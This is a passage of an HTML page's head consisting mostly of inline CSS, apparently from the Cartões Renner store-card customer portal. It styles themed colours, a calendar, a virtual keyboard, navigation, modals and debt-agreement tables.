         .ir-versao-completa .button {
         width: 100%;
         height: 40px;
         line-height: 40px; } }
         .modal-sair-acesso-rapido.modal-acesso-rapido .modal__actions {
         -webkit-box-orient: horizontal;
         -webkit-box-direction: normal;
         flex-direction: row; }
         .modal-sair-acesso-rapido.modal-acesso-rapido .modal__actions .button {
         margin-bottom: 0; }
      </style>
      <style type="text/css">aviso-bloqueio .aviso-bloqueio__icon {
         margin: 0 auto 15px;
         width: 26px;
         height: 26px;
         color: #acacac; }
         aviso-bloqueio .aviso-bloqueio {
         padding: 100px 0; }
         aviso-bloqueio .aviso-bloqueio__text {
         text-align: center;
         color: #acacac;
         font-weight: 400; }
         aviso-bloqueio .aviso-bloqueio__text.aviso-bloqueio__text--small {
         font-size: 14px; }
         aviso-bloqueio .aviso-bloqueio__text.aviso-bloqueio__text--medium {
         font-size: 16px; }
         aviso-bloqueio .aviso-bloqueio__text .aviso-bloqueio__text-link {
         text-transform: none;
         color: #acacac; }
         main.cartao-renner .aviso-bloqueio--meu-cartao {
         display: none; }
      </style>
      <style type="text/css">.cartao-renner .bg-themed, .cartao-renner .calendar .calendar__content .calendar__content-options .calendar__content-value.selected span, .calendar .calendar__content .calendar__content-options .calendar__content-value.selected .cartao-renner span,
         .meu-cartao .cartao-renner .bg-themed,
         .meu-cartao .cartao-renner .calendar .calendar__content .calendar__content-options .calendar__content-value.selected span,
         .calendar .calendar__content .calendar__content-options .calendar__content-value.selected .meu-cartao .cartao-renner span {
         background-color: #d71920; }
         .cartao-renner .bg-themed--selected {
         background-color: #810f13; }
         .cartao-renner .border-themed,
         .meu-cartao .cartao-renner .border-themed {
         border-color: #d71920; }
         .cartao-renner .border-themed--selected {
         border-color: #810f13; }
         .cartao-renner .text-themed,
         .meu-cartao .cartao-renner .text-themed {
         color: #d71920; }
         .cartao-renner .text-themed--selected {
         color: #810f13; }
         .cartao-renner.theme-priority .bg-themed, .cartao-renner.theme-priority .calendar .calendar__content .calendar__content-options .calendar__content-value.selected span, .calendar .calendar__content .calendar__content-options .calendar__content-value.selected .cartao-renner.theme-priority span {
         background-color: #ac8947; }
         .cartao-renner.theme-priority .border-themed {
         border-color: #ac8947; }
         .cartao-renner.theme-priority .text-themed {
         color: #ac8947; }
         .meu-cartao .bg-themed, .meu-cartao .calendar .calendar__content .calendar__content-options .calendar__content-value.selected span, .calendar .calendar__content .calendar__content-options .calendar__content-value.selected .meu-cartao span,
         .cartao-renner .meu-cartao .bg-themed,
         .cartao-renner .meu-cartao .calendar .calendar__content .calendar__content-options .calendar__content-value.selected span,
         .calendar .calendar__content .calendar__content-options .calendar__content-value.selected .cartao-renner .meu-cartao span {
         background-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         border-color: #997a3f; }
         .meu-cartao .border-themed,
         .cartao-renner .meu-cartao .border-themed {
         border-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         background-color: #997a3f; }
         .meu-cartao .text-themed,
         .cartao-renner .meu-cartao .text-themed {
         color: #ac8947; }
         .meu-cartao .text-themed--selected {
         color: #997a3f; }
         .meu-cartao.theme-priority .bg-themed, .meu-cartao.theme-priority .calendar .calendar__content .calendar__content-options .calendar__content-value.selected span, .calendar .calendar__content .calendar__content-options .calendar__content-value.selected .meu-cartao.theme-priority span {
         background-color: #ac8947; }
         .meu-cartao.theme-priority .border-themed {
         border-color: #ac8947; }
         .meu-cartao.theme-priority .text-themed {
         color: #ac8947; }
         .cartao-renner .hidden-for-cartao-renner {
         display: none; }
         .meu-cartao .hidden-for-meu-cartao {
         display: none; }
         .calendar {
         position: relative; }
         .calendar .calendar__overlay {
         position: fixed;
         top: 0;
         left: 0;
         width: 100%;
         height: 100vh; }
         .calendar .calendar__container {
         position: absolute;
         right: 0;
         z-index: 1;
         border: 1px solid #e0e0e0;
         border-radius: 3px;
         box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.5);
         background-color: white;
         width: 240px; }
         .calendar .calendar__header {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: justify;
         justify-content: space-between;
         border-bottom: 1px solid #e0e0e0;
         padding: 15px;
         color: #acacac;
         font-size: 14px; }
         .calendar .calendar__header .calendar__header-actual {
         color: #1e1e1f;
         font-weight: 700; }
         .calendar .calendar__header .calendar__header-arrow {
         display: inline-block;
         width: 12px;
         height: 12px; }
         .calendar .calendar__header .calendar__header-prev,
         .calendar .calendar__header .calendar__header-next {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         cursor: pointer; }
         .calendar .calendar__header .calendar__header-prev span:first-child,
         .calendar .calendar__header .calendar__header-next span:first-child {
         margin-right: 10px; }
         .calendar .calendar__header .calendar__header-next .calendar__header-arrow {
         -webkit-transform: rotate(180deg);
         transform: rotate(180deg); }
         .calendar .calendar__content {
         padding: 10px; }
         .calendar .calendar__content .calendar__content-value {
         width: calc(100% / 7);
         text-align: center;
         color: #1e1e1f;
         font-size: 14px;
         font-weight: 400; }
         .calendar .calendar__content .calendar__content-header,
         .calendar .calendar__content .calendar__content-options {
         display: -webkit-box;
         display: flex;
         flex-wrap: wrap;
         width: 100%; }
         .calendar .calendar__content .calendar__content-header .calendar__content-value {
         font-weight: 700; }
         .calendar .calendar__content .calendar__content-options .calendar__content-value {
         cursor: pointer; }
         .calendar .calendar__content .calendar__content-options .calendar__content-value:not(.selectable) {
         cursor: inherit;
         color: #acacac; }
         .calendar .calendar__content .calendar__content-options .calendar__content-value.today {
         font-weight: 700; }
         .calendar .calendar__content .calendar__content-options .calendar__content-value span {
         display: block;
         margin: 0 auto;
         border-radius: 50%;
         line-height: 25px;
         width: 25px;
         height: 25px; }
         .calendar .calendar__content .calendar__content-options .calendar__content-value.selected span {
         color: #fff; }
      </style>
      <style type="text/css">.credit-card {
         display: inline-block;
         position: relative;
         line-height: 100%;
         color: #706f6f; }
         .credit-card svg > * {
         fill: #706f6f; }
         .credit-card__icon {
         display: inline-block;
         position: absolute;
         top: 50%;
         left: 0;
         -webkit-transform: translateY(-50%);
         transform: translateY(-50%);
         width: 20px;
         height: 20px; }
         .credit-card__text {
         display: inline-block;
         padding-left: 25px;
         letter-spacing: -1px;
         white-space: nowrap;
         font-size: 14px;
         font-weight: 400; }
         .credit-card--inverse {
         color: #fff; }
         .credit-card--inverse svg > * {
         fill: #fff; }
         .credit-card--small .credit-card__icon {
         width: 14px;
         height: 14px; }
         .credit-card--small .credit-card__text {
         padding-left: 22px;
         font-size: 12px; }
      </style>
      <style type="text/css">.email-parametrizado a {
         text-decoration: none; }
      </style>
      <style type="text/css">icon-cartao {
         display: -webkit-inline-box;
         display: inline-flex; }
         icon-cartao svg {
         height: 13px; }
      </style>
      <style type="text/css">.cartao-renner .bg-themed,
         .meu-cartao .cartao-renner .bg-themed {
         background-color: #d71920; }
         .cartao-renner .bg-themed--selected {
         background-color: #810f13; }
         .cartao-renner .border-themed,
         .meu-cartao .cartao-renner .border-themed {
         border-color: #d71920; }
         .cartao-renner .border-themed--selected {
         border-color: #810f13; }
         .cartao-renner .text-themed,
         .meu-cartao .cartao-renner .text-themed {
         color: #d71920; }
         .cartao-renner .text-themed--selected {
         color: #810f13; }
         .cartao-renner.theme-priority .bg-themed {
         background-color: #ac8947; }
         .cartao-renner.theme-priority .border-themed {
         border-color: #ac8947; }
         .cartao-renner.theme-priority .text-themed {
         color: #ac8947; }
         .meu-cartao .bg-themed,
         .cartao-renner .meu-cartao .bg-themed {
         background-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         border-color: #997a3f; }
         .meu-cartao .border-themed,
         .cartao-renner .meu-cartao .border-themed {
         border-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         background-color: #997a3f; }
         .meu-cartao .text-themed,
         .cartao-renner .meu-cartao .text-themed {
         color: #ac8947; }
         .meu-cartao .text-themed--selected {
         color: #997a3f; }
         .meu-cartao.theme-priority .bg-themed {
         background-color: #ac8947; }
         .meu-cartao.theme-priority .border-themed {
         border-color: #ac8947; }
         .meu-cartao.theme-priority .text-themed {
         color: #ac8947; }
         .cartao-renner .hidden-for-cartao-renner {
         display: none; }
         .meu-cartao .hidden-for-meu-cartao {
         display: none; }
         icon-themed {
         display: inline-block;
         width: 26px;
         height: 26px; }
         .icon-themed {
         display: block; }
         .icon-themed__icon {
         display: block;
         height: auto; }
         .icon-themed__icon--smaller {
         width: 18px;
         height: 18px; }
         .icon-themed__icon--small {
         width: 26px;
         height: 26px; }
         .icon-themed__icon--large {
         width: 40px;
         height: 40px; }
      </style>
      <style type="text/css">.back-link {
         cursor: pointer;
         font-size: 16px;
         font-weight: 400; }
         .back-link .icon {
         display: inline-block;
         margin-right: 6px;
         width: 11px; }
         .ie .back-link .icon {
         height: 8px; }
      </style>
      <style type="text/css">.user-information {
         display: -webkit-box;
         display: flex;
         position: relative;
         -webkit-box-align: center;
         align-items: center;
         padding: 20px 12px;
         color: #fff; }
         .user-information .user-information__icon {
         width: 40px;
         height: 40px; }
         .user-information .user-information__icon .text-themed {
         color: #fff; }
         .user-information .user-information__info {
         margin: 0 0 0 12px;
         width: 100%;
         overflow: hidden; }
         .user-information .user-information__info .user-information__info-name {
         margin: 0;
         width: 100%;
         overflow: hidden;
         text-overflow: ellipsis;
         line-height: 105%;
         white-space: nowrap;
         font-size: 17px;
         font-weight: 400; }
         .user-information .user-information__info .user-information__card-icon {
         width: 20px;
         height: 20px; }
         .user-information .user-information__info .user-information__info-card * {
         display: inline-block; }
         .user-information .user-information__info .user-information__info-card strong {
         letter-spacing: -1px;
         font-size: 14px;
         font-weight: 400; }
         .user-information .user-information__logout {
         margin: 0 0 0 12px;
         padding: 0;
         width: 40px;
         min-width: 25px;
         text-align: center;
         line-height: 250%;
         font-size: 14px; }
         .user-information .user-information__logout .icon {
         display: block;
         -webkit-transform: rotate(180deg);
         transform: rotate(180deg);
         margin: 0 auto;
         width: 15px; }
         @media (max-width: 767px) {
         .user-information {
         border-radius: 0;
         padding: 20px; } }
      </style>
      <style type="text/css">.no-results {
         text-align: center;
         color: #acacac; }
         .no-results__icon {
         margin: 25px auto 20px;
         width: 26px;
         height: 26px; }
         .no-results__text {
         text-align: center;
         color: #acacac;
         font-size: 16px;
         font-weight: 400; }
         .no-results .no-results__button.button.button--outline {
         border-color: #acacac;
         background-color: transparent;
         width: 181px;
         height: 30px;
         line-height: 30px;
         color: #acacac;
         font-size: 14px; }
         .no-results .no-results__button.button.button--outline:focus {
         border-color: #acacac;
         background-color: transparent;
         color: #acacac; }
         @media (min-width: 1024px) {
         .no-results .no-results__button.button.button--outline:hover,
         .no-results .no-results__button.button.button--outline:hover:focus {
         border-color: #acacac;
         background-color: #acacac;
         color: #fff; } }
         @media (max-width: 1023px) {
         .no-results .no-results__button.button.button--outline:active {
         border-color: #acacac;
         background-color: #acacac;
         color: #fff; } }
         @media (max-width: 767px) {
         .no-results--small {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         margin-bottom: 5px; }
         .no-results--small .no-results__icon {
         -webkit-box-flex: 1;
         flex: 1 1 auto;
         margin: auto;
         width: 40px;
         height: 40px; }
         .no-results--small .no-results__text {
         -webkit-box-flex: 1;
         flex: 1 1 auto;
         margin-bottom: 0;
         text-align: center; } }
         .promise-pending,
         .promise-fail .no-results--success,
         .promise-success .no-results--fail,
         .no-promise .no-results--fail {
         display: none; }
      </style>
      <style type="text/css">request-error {
         display: block; }
         .request-error {
         flex-shrink: 1;
         text-align: left;
         line-height: 100%;
         font-family: Arial;
         font-size: 12px; }
         .request-error--error {
         color: #cf3e3e; }
         .request-error--success {
         color: #3ecf7a; }
         .request-error-container {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         margin-bottom: 20px;
         min-height: 18px; }
         .request-error-icon {
         flex-shrink: 0;
         margin-right: 10px;
         width: 18px;
         height: 18px; }
         .request-error-on-textfield .request-error-container {
         display: none; }
         .request-error-on-textfield .textfield-request-error .ng-dirty.ng-invalid ~ .field-message {
         visibility: visible !important; }
      </style>
      <style type="text/css">.password-tips {
         font-size: 14px; }
         .password-tips__items {
         margin: 0;
         padding: 0;
         list-style: none;
         color: #706f6f; }
         .password-tips__items li:before {
         margin-right: 5px;
         content: "-"; }
         .password-tips__title {
         display: block;
         margin-bottom: 5px;
         color: #706f6f;
         font-weight: bold;
         font-style: normal; }
      </style>
      <style type="text/css">.virtual-keyboard {
         display: -webkit-box;
         display: flex;
         flex-wrap: wrap;
         justify-content: space-around;
         margin: 0;
         padding: 0;
         padding-bottom: 20px;
         overflow: hidden;
         list-style: none; }
         .virtual-keyboard__key {
         margin-bottom: 10px;
         width: calc(100% * (1 / 3) - 10px); }
         .virtual-keyboard__key .button {
         padding: 0;
         white-space: nowrap;
         font-weight: 700; }
         .virtual-keyboard__key__value:not(:last-child):after {
         content: " ou "; }
         .virtual-keyboard__key--backspace button {
         position: relative; }
         .virtual-keyboard__key--backspace svg {
         position: absolute;
         top: 50%;
         left: 50%;
         margin-top: -10px;
         margin-left: -15px;
         width: 30px;
         height: 20px; }
         .virtual-keyboard__key--backspace .button:focus:active span {
         position: static; }
         .input-password-bullet {
         padding-left: 0 !important;
         text-align: center;
         letter-spacing: 5px;
         font-size: 2.5rem-rem-calc(1)/2; }
      </style>
      <style type="text/css">.modal-pesquisa-interesse-pagamento-debito.modal {
         padding-top: 40px;
         text-align: center; }
         .modal-pesquisa-interesse-pagamento-debito .modal__title {
         margin-top: 0;
         text-transform: none;
         font-weight: 700;
         font-style: normal; }
         .modal-pesquisa-interesse-pagamento-debito .modal__content {
         margin: 0; }
         .modal-pesquisa-interesse-pagamento-debito .modal__actions {
         display: -webkit-box;
         display: flex; }
         .modal-pesquisa-interesse-pagamento-debito__button.button {
         width: 100%;
         height: 100px;
         line-height: 20px;
         font-weight: 700; }
         .modal-pesquisa-interesse-pagamento-debito__button.button:first-child {
         margin-right: 20px; }
         .modal-pesquisa-interesse-pagamento-debito__button.button span {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-flow: column;
         -webkit-box-pack: center;
         justify-content: center; }
         .modal-pesquisa-interesse-pagamento-debito__button.button svg {
         margin-bottom: 10px;
         width: 26px;
         height: 26px; }
      </style>
      <style type="text/css">.loading-bar {
         padding: 0 20px; }
         .loading-bar h3,
         .loading-bar p {
         margin: 0;
         text-align: center;
         color: #1e1e1f;
         font-size: 14px; }
         .loading-bar p {
         margin-top: 5px;
         font-size: 12px; }
         .loading-bar .loading-bar-container {
         margin-top: 20px; }
      </style>
      <style type="text/css">.site-header {
         position: relative;
         z-index: 2;
         background-color: #1e1e1f;
         padding: 10px 0;
         height: 60px; }
         .site-header .site-header__left-logo {
         display: inline-block;
         margin: 0; }
         .site-header .site-header__left-logo img {
         display: block; }
         .site-header .site-header__left-logo .site-header__logo-icon {
         margin-top: -5px;
         width: 100px;
         height: 50px; }
         .site-header .site-header__right .ir-para-loja-virtual,
         .site-header .site-header__right .sair-header {
         border-color: #fff;
         background-color: transparent;
         height: 40px;
         line-height: 40px;
         color: #fff;
         font-size: 16px; }
         .site-header .site-header__right .ir-para-loja-virtual:hover,
         .site-header .site-header__right .sair-header:hover {
         background-color: #fff;
         color: #1e1e1f; }
         .site-header .site-header__right .sair-header {
         margin-left: 18px; }
         .site-header .site-header__right .sair-header .icon {
         display: inline-block;
         position: relative;
         top: 3px;
         -webkit-transform: rotate(180deg);
         transform: rotate(180deg);
         margin-right: 2px;
         width: 15px;
         height: 15px; }
         .not-logged .site-header .site-header__right .sair-header {
         display: none; }
         @media (min-width: 768px) and (max-width: 1023px) {
         .site-header {
         padding: 10px; } }
         @media (max-width: 767px) {
         .app-shell .site-header {
         display: none; }
         .site-header {
         padding: 0;
         height: 30px; }
         .site-header .site-header__right {
         text-align: center; }
         .site-header .site-header__right .ir-para-loja-virtual,
         .site-header .site-header__right .sair-header {
         border: none;
         height: 30px;
         line-height: 30px;
         font-size: 14px; }
         .site-header .site-header__right .sair-header {
         float: right; }
         .site-header .site-header__right .ir-para-loja-virtual {
         position: relative; } }
      </style>
      <style type="text/css">informacoes-contato {
         display: block; }
         .bloco-contatos:not(:last-child) {
         margin-bottom: 15px; }
         main.meu-cartao .contatos-atendimento-cbr {
         display: block; }
         main.meu-cartao .contatos-atendimento-ccr {
         display: none; }
         main.cartao-renner .contatos-atendimento-cbr {
         display: none; }
         main.cartao-renner .contatos-atendimento-ccr {
         display: block; }
         .contatos-atendimento {
         line-height: 1; }
         .contatos-atendimento__title {
         margin-bottom: 5px;
         text-transform: lowercase;
         line-height: 100%;
         font-size: 14px;
         font-weight: 300; }
         .bloqueio .contatos-atendimento__title {
         font-style: italic; }
         .contatos-atendimento__text {
         display: block;
         margin: 5px 0;
         line-height: 120%;
         color: #706f6f;
         font-size: 12px;
         font-weight: 300; }
         .contatos-atendimento__phone {
         display: block;
         text-decoration: none;
         letter-spacing: -0.5px;
         color: #1e1e1f;
         font-size: 14px;
         font-weight: 700; }
         .contatos-atendimento__phone-icon {
         display: inline-block;
         width: 16px;
         height: 16px;
         color: #acacac; }
         .contatos-atendimento__separator {
         margin: 10px 0;
         border: none; }
         @media (max-width: 767px) {
         informacoes-contato {
         padding: 10px 0 0;
         text-align: center; }
         .bloco-contatos:not(:last-child) {
         margin-bottom: 20px; } }
         .contatos-atendimento--center {
         text-align: center; }
         .contatos-atendimento--center .contatos-atendimento__text--bottom {
         margin-top: 10px;
         font-size: 11px; }
         .contatos-atendimento--center .contatos-atendimento__text--bottom br {
         display: block !important; }
      </style>
      <style type="text/css">.cartao-renner .bg-themed,
         .meu-cartao .cartao-renner .bg-themed {
         background-color: #d71920; }
         .cartao-renner .bg-themed--selected, .cartao-renner .navigation .navigation__link.selected, .navigation .cartao-renner .navigation__link.selected {
         background-color: #810f13; }
         .cartao-renner .border-themed,
         .meu-cartao .cartao-renner .border-themed {
         border-color: #d71920; }
         .cartao-renner .border-themed--selected, .cartao-renner .navigation .navigation__link.selected, .navigation .cartao-renner .navigation__link.selected {
         border-color: #810f13; }
         .cartao-renner .text-themed, .cartao-renner .navigation .navigation__link:not(.selected):hover, .navigation .cartao-renner .navigation__link:not(.selected):hover,
         .meu-cartao .cartao-renner .text-themed,
         .meu-cartao .cartao-renner .navigation .navigation__link:not(.selected):hover,
         .navigation .meu-cartao .cartao-renner .navigation__link:not(.selected):hover {
         color: #d71920; }
         .cartao-renner .text-themed--selected {
         color: #810f13; }
         .cartao-renner.theme-priority .bg-themed {
         background-color: #ac8947; }
         .cartao-renner.theme-priority .border-themed {
         border-color: #ac8947; }
         .cartao-renner.theme-priority .text-themed, .cartao-renner.theme-priority .navigation .navigation__link:not(.selected):hover, .navigation .cartao-renner.theme-priority .navigation__link:not(.selected):hover {
         color: #ac8947; }
         .meu-cartao .bg-themed,
         .cartao-renner .meu-cartao .bg-themed {
         background-color: #ac8947; }
         .meu-cartao .bg-themed--selected, .meu-cartao .navigation .navigation__link.selected, .navigation .meu-cartao .navigation__link.selected {
         border-color: #997a3f; }
         .meu-cartao .border-themed,
         .cartao-renner .meu-cartao .border-themed {
         border-color: #ac8947; }
         .meu-cartao .bg-themed--selected, .meu-cartao .navigation .navigation__link.selected, .navigation .meu-cartao .navigation__link.selected {
         background-color: #997a3f; }
         .meu-cartao .text-themed, .meu-cartao .navigation .navigation__link:not(.selected):hover, .navigation .meu-cartao .navigation__link:not(.selected):hover,
         .cartao-renner .meu-cartao .text-themed,
         .cartao-renner .meu-cartao .navigation .navigation__link:not(.selected):hover,
         .navigation .cartao-renner .meu-cartao .navigation__link:not(.selected):hover {
         color: #ac8947; }
         .meu-cartao .text-themed--selected {
         color: #997a3f; }
         .meu-cartao.theme-priority .bg-themed {
         background-color: #ac8947; }
         .meu-cartao.theme-priority .border-themed {
         border-color: #ac8947; }
         .meu-cartao.theme-priority .text-themed, .meu-cartao.theme-priority .navigation .navigation__link:not(.selected):hover, .navigation .meu-cartao.theme-priority .navigation__link:not(.selected):hover {
         color: #ac8947; }
         .cartao-renner .hidden-for-cartao-renner {
         display: none; }
         .meu-cartao .hidden-for-meu-cartao {
         display: none; }
         .layout__sidebar {
         position: relative;
         z-index: 3; }
         .layout__sidebar .layout__sidebar-container {
         top: auto; }
         .layout__sidebar .layout__sidebar-container.fixed {
         position: fixed;
         top: 10px;
         left: auto; }
         .user-information {
         border-radius: 3px 3px 0 0; }
         .layout__sidebar .layout__sidebar-container {
         position: -webkit-sticky;
         position: sticky;
         top: 10px; }
         .ie .layout__sidebar .layout__sidebar-container {
         position: static;
         top: auto; }
         @media only screen and (min-width: 768px) and (max-width: 997px) {
         .layout__sidebar .layout__sidebar-container {
         position: -webkit-sticky;
         position: sticky;
         top: 10px; } }
         .navigation .navigation__link {
         display: -webkit-box;
         display: flex;
         position: relative;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-orient: horizontal;
         -webkit-box-direction: normal;
         flex-direction: row;
         -webkit-transition: height 1s ease;
         transition: height 1s ease;
         border: 1px solid #e0e0e0;
         border-top: none;
         background-color: #fff;
         padding-left: 20px;
         height: 60px;
         overflow: hidden;
         text-transform: lowercase;
         text-decoration: none;
         line-height: 60px;
         color: #706f6f;
         font-size: 18px;
         font-weight: 300; }
         .navigation .navigation__link:not(.selected):hover {
         background-color: #f2f2f2; }
         .navigation .navigation__link.selected {
         color: #fff; }
         .navigation .navigation__link .navigation__link-icon {
         display: block;
         margin-right: 20px;
         width: 22px;
         height: 22px;
         line-height: 100%; }
         .navigation .navigation__link svg {
         display: inline-block; }
         .navigation .navigation__link.ng-hide {
         height: 0; }
         .navigation .navigation__link--loja .navigation__link-icon {
         margin-top: -5px;
         width: 30px;
         height: 30px; }
         .navigation .navigation__link:last-of-type {
         border-radius: 0 0 3px 3px; }
         @media (min-width: 768px) and (max-width: 1023px) {
         .layout__sidebar {
         -webkit-box-flex: 0;
         flex: 0 0 250px;
         padding-right: 0;
         padding-left: 0;
         max-width: 250px; }
         .layout__sidebar .layout__sidebar-container {
         width: 250px;
         max-width: 250px; } }
         @media (max-width: 767px) {
         .meu-cartao .navigation {
         background-color: #ac8947; }
         .cartao-renner .navigation {
         background-color: #d71920; }
         .layout__sidebar .layout__sidebar-container {
         position: static;
         width: auto; }
         .layout__sidebar {
         -webkit-box-flex: 0;
         flex: 0 0 100%;
         z-index: 7;
         padding-right: 0;
         padding-left: 0;
         max-width: 100%; }
         .layout__sidebar .layout__sidebar-container {
         position: static;
         width: auto; }
         .layout__sidebar .layout__sidebar-container.fixed {
         position: static; }
         .navigation {
         display: -webkit-box;
         display: flex;
         position: fixed;
         right: 0;
         bottom: 0;
         left: 0;
         -webkit-box-pack: center;
         justify-content: center; }
         .navigation > * {
         -webkit-box-flex: 1;
         flex: 1; }
         .navigation .navigation__link {
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         -webkit-box-pack: center;
         justify-content: center;
         -webkit-transition: opacity 1s ease;
         transition: opacity 1s ease;
         border: none;
         background-color: transparent;
         padding: 0;
         height: 50px;
         text-align: center;
         line-height: 100%;
         color: #fff;
         font-size: 11px; }
         .navigation .navigation__link:not(.selected):hover {
         background-color: transparent;
         color: #fff !important; }
         .navigation .navigation__link.selected {
         background-color: transparent !important;
         color: rgba(0, 0, 0, 0.5); }
         .navigation .navigation__link .navigation__link-icon {
         margin-right: 0;
         margin-bottom: 2px; }
         .navigation .navigation__link.ng-hide {
         opacity: 0;
         height: inherit; }
         .box-contatos-atendimento-mobile {
         display: block !important;
         margin-top: 30px; }
         .layout__content-container {
         -webkit-box-flex: 0;
         flex: 0 0 100%;
         max-width: 100%; }
         .layout__sidebar .layout__sidebar-container .banner-conferir-beneficios {
         display: none; } }
         @media only screen and (min-width: 767px) and (max-height: 620px) {
         .navigation .navigation__link {
         height: 56px;
         line-height: 56px; } }
      </style>
      <link href="/cartoes-renner/images/favicon.ico" type="image/x-icon" rel="icon">
      <link href="/cartoes-renner/images/lojas-renner.png" sizes="144x144" rel="icon">
      <link href="/cartoes-renner/images/lojas-renner.png" rel="apple-touch-icon">
      <style type="text/css">.modal-confirmar-telefone .modal__icon-title {
         display: none; }
         .modal-confirmar-telefone h1 {
         margin-top: 0;
         margin-bottom: 41px;
         font-size: 24px;
         font-weight: normal; }
         .modal-confirmar-telefone .modal__content {
         margin-bottom: 0; }
         .modal-confirmar-telefone .modal--actions {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .modal-confirmar-telefone .modal--actions .button {
         width: calc(50% - 10px); }
      </style>
      <style type="text/css">.ie .lista-acordos .block__header-countdown {
         top: -8px; }
         .lista-acordos .block__header {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         flex-wrap: wrap;
         margin-bottom: 0; }
         .lista-acordos .block__header-title, .lista-acordos .block__header-atraso, .lista-acordos .block__header-texto-descritivo, .lista-acordos .block__header-countdown {
         margin-bottom: 15px; }
         .lista-acordos .block__header .block__header-atraso {
         -webkit-box-flex: 1;
         flex-grow: 1;
         text-align: right; }
         .lista-acordos .block__header .block__header-atraso .block__header-text {
         color: #cf3e3e;
         font-size: 12px;
         font-style: italic; }
         .lista-acordos .block__header .block__header-texto-descritivo {
         width: 100%;
         color: #706f6f;
         font-size: 14px; }
         .lista-acordos .block__header .block__header-texto-descritivo p {
         margin-bottom: 0; }
         .lista-acordos .block__header .block__header-countdown {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-flex: 1;
         flex-grow: 1;
         -webkit-box-pack: end;
         justify-content: flex-end; }
         .lista-acordos .block__header .block__header-countdown .block__header-text {
         margin-right: 10px;
         color: #706f6f;
         font-size: 12px;
         font-style: italic; }
         .lista-acordos .block__header .block__header-countdown .circular-chart,
         .lista-acordos .block__header .block__header-countdown .circular-chart .chart__svg {
         width: 50px;
         height: 50px; }
         .lista-acordos .block__header .block__header-countdown .circular-chart .chart__svg {
         -webkit-transform: scaleX(-1);
         transform: scaleX(-1); }
         .lista-acordos .loader__invisibility-cloak {
         min-height: 100px; }
         .lista-acordos .no-results__text {
         display: inline-block;
         max-width: 300px; }
         .lista-acordos .table-acordos.onboarding-item {
         background: #fff; }
         .lista-acordos .table-acordos {
         margin-bottom: 20px;
         border-collapse: collapse;
         text-align: left;
         color: #706f6f;
         font-size: 14px;
         font-weight: 400; }
         .lista-acordos .table-acordos tr {
         border-bottom: 1px solid #e0e0e0; }
         .lista-acordos .table-acordos tbody tr:last-of-type {
         border-bottom: none; }
         .lista-acordos .table-acordos th {
         padding: 10px;
         text-align: left;
         font-weight: 400; }
         .lista-acordos .table-acordos .table-acordos__contrato,
         .lista-acordos .table-acordos .table-acordos__valor {
         color: #1e1e1f; }
         .lista-acordos .table-acordos .table-acordos__valor {
         font-weight: 700; }
         .lista-acordos .table-acordos .table-acordos__valor.table-acordos__valor--atraso {
         color: #cf3e3e; }
         .lista-acordos .table-acordos .table-acordos__boleto button,
         .lista-acordos .table-acordos .table-acordos__boleto button:focus {
         background-color: transparent;
         width: 100%; }
         .lista-acordos .table-acordos .table-acordos__boleto .loader__bubble,
         .lista-acordos .table-acordos .table-acordos__boleto .loader--show button {
         cursor: default; }
         .lista-acordos .table-acordos .table-acordos__item {
         background-color: transparent;
         cursor: pointer;
         height: 63px; }
         .lista-acordos .table-acordos .table-acordos__item td {
         padding: 10px; }
         .lista-acordos .table-acordos .table-acordos__item:hover {
         background-color: #f2f2f2; }
         @media (max-width: 1023px) {
         .lista-acordos .block__header {
         -webkit-box-align: start;
         align-items: flex-start;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .lista-acordos .block__header .block__header-title {
         -webkit-box-ordinal-group: 2;
         order: 1; }
         .lista-acordos .block__header .block__header-texto-descritivo {
         -webkit-box-ordinal-group: 3;
         order: 2; }
         .lista-acordos .block__header .block__header-atraso {
         -webkit-box-ordinal-group: 4;
         order: 3;
         text-align: initial; }
         .lista-acordos .table-acordos .table-acordos__item td > span {
         display: block; }
         .lista-acordos .table-acordos .table-acordos__item .table-acordos__right-column {
         text-align: right; } }
         @media (max-width: 767px) {
         .lista-acordos .table-acordos .table-acordos__item td {
         padding: 5px; } }
      </style>
      <style type="text/css">.modal-data-vencimento {
         width: 450px; }
         .modal-data-vencimento .modal__icon-title {
         margin: 0;
         line-height: 24px; }
         .modal-data-vencimento .modal__content {
         margin: 0; }
         .modal-data-vencimento .modal__content .subtitle {
         margin: 25px 0 0;
         text-align: center;
         line-height: 21px;
         color: #1e1e1f;
         font-size: 16px;
         font-weight: 300; }
         .modal-data-vencimento .modal__content .calendar {
         margin-top: 30px;
         max-width: 325px; }
         .modal-data-vencimento .modal__content .calendar .calendar__container {
         top: 45px; }
         .modal-data-vencimento .modal__content .calendar .textfield label {
         left: 0; }
         .modal-data-vencimento .modal__content .calendar .textfield input {
         padding-left: 0; }
         .modal-data-vencimento .modal__content .info {
         margin: 30px 0 0;
         text-align: left;
         line-height: 15px;
         color: #1e1e1f;
         font-size: 12px;
         font-weight: 300; }
         .modal-data-vencimento .modal__actions {
         margin-top: 30px; }
         .modal-data-vencimento .modal__mensagem-informativa {
         margin-top: 30px; }
         @media (min-width: 768px) and (max-width: 1023px) {
         .ipad .modal-data-vencimento {
         position: fixed;
         top: 50%;
         left: 50%;
         -webkit-transform: translate(-50%, -50%);
         transform: translate(-50%, -50%); } }
         .bloco-divida {
         margin-bottom: 20px;
         border: 1px solid #e0e0e0;
         padding: 20px; }
      </style>
      <style type="text/css">.lista-evolucao-pagamento {
         display: -webkit-box;
